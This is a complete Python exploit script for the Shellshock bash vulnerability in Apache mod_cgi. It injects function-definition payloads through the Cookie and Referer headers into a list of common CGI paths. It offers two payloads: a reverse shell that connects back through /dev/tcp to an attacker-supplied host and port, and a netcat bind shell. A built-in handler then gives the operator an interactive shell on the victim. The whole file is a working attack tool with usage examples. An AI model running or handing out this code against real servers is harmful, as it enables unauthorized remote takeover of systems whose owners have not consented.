
#!/usr/bin/env python3
from socket import *
from threading import Thread
import _thread as thread
import time
import http.client as httplib
import urllib.parse as urllib
import sys

stop = False
proxyhost = ""
proxyport = 0

# ANSI escape codes for colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
ENDC = "\033[0m"

def usage():
    print(f"""
{GREEN}
    Shellshock apache mod_cgi remote exploit

Usage:
    ./exploit.py var=<value>

Vars:
    rhost: victim host
    rport: victim port for TCP shell binding
    lhost: attacker host for TCP shell reversing
    lport: attacker port for TCP shell reversing
    pages: specific cgi vulnerable pages (separated by comma)
    proxy: host:port proxy

Payloads:
    "reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
    "bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)

Example:
    ./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
    ./exploit.py payload=bind rhost=1.2.3.4 rport=1234
{ENDC}
""")
    sys.exit(0)

def exploit(lhost,lport,rhost,rport,payload,pages):
    headers = {"Cookie": payload, "Referer": payload}
    
    for page in pages:
        if stop:
            return
        print(f"{YELLOW}[-] Trying exploit on: {page}{ENDC}")
        if proxyhost != "":
            c = httplib.HTTPConnection(proxyhost, proxyport)
            c.request("GET", f"http://{rhost}{page}", headers=headers)
            res = c.getresponse()
        else:
            c = httplib.HTTPConnection(rhost)
            c.request("GET", page, headers=headers)
            res = c.getresponse()
        if res.status == 404:
            print(f"{RED}[*] 404 on: {page}{ENDC}")
        time.sleep(1)

args = {}
    
for arg in sys.argv[1:]:
    ar = arg.split("=")
    args[ar[0]] = ar[1]
try:
    args['payload']
except:
    usage()
    
if args['payload'] == 'reverse':
    try:
        lhost = args['lhost']
        lport = int(args['lport'])
        rhost = args['rhost']
        payload = f"() {{ :;}}; /bin/bash -c /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &"
    except:
        usage()
elif args['payload'] == 'bind':
    try:
        rhost = args['rhost']
        rport = args['rport']
        payload = f"() {{ :;}}; /bin/bash -c 'nc -l -p {rport} -e /bin/bash &'"
    except:
        usage()
else:
    print(f"{RED}[*] Unsupported payload{ENDC}")
    usage()
    
try:
    pages = args['pages'].split(",")
except:
    pages = ["/cgi-sys/entropysearch.cgi", "/cgi-sys/defaultwebpage.cgi", "/cgi-mod/index.cgi", "/cgi-bin/test.cgi", "/cgi-bin-sdb/printenv"]

try:
    proxyhost, proxyport = args['proxy'].split(":")
except:
    pass
            
if args['payload'] == 'reverse':
    serversocket = socket(AF_INET, SOCK_STREAM)
    buff = 1024
    addr = (lhost, lport)
    serversocket.bind(addr)
    serversocket.listen(10)
    print(f"{BLUE}[!] Started reverse shell handler{ENDC}") 
    thread.start_new_thread(exploit, (lhost, lport, rhost, 0, payload, pages,))
if args['payload'] == 'bind':
    serversocket = socket(AF_INET, SOCK_STREAM)
    addr = (rhost, int(rport))
    thread.start_new_thread(exploit, ("", 0, rhost, rport, payload, pages,))
    
buff = 1024
    
while True:
    if args['payload'] == 'reverse':
        clientsocket, clientaddr = serversocket.accept()
        print(f"{GREEN}[!] Successfully exploited{ENDC}")
        print(f"{GREEN}[!] Incoming connection from {clientaddr[0]}{ENDC}")
        stop = True
        clientsocket.settimeout(3)
        while True:
            reply = input(f"{clientaddr[0]}> ")
            clientsocket.sendall(reply.encode() + b"\n")
            try:
                data = clientsocket.recv(buff)
                print(data.decode())
            except:
                pass
        
    if args['payload'] == 'bind':
        try:
            serversocket = socket(AF_INET, SOCK_STREAM)
            time.sleep(1)
            serversocket.connect(addr)
            print(f"{GREEN}[!] Successfully exploited{ENDC}")
            print(f"{GREEN}[!] Connected to {rhost}{ENDC}")
            stop = True
            serversocket.settimeout(3)
            while True:
                reply = input(f"{rhost}> ")
                serversocket.sendall(reply.encode() + b"\n")
                data = serversocket.recv(buff)
                print(data.decode())
        except:
            pass
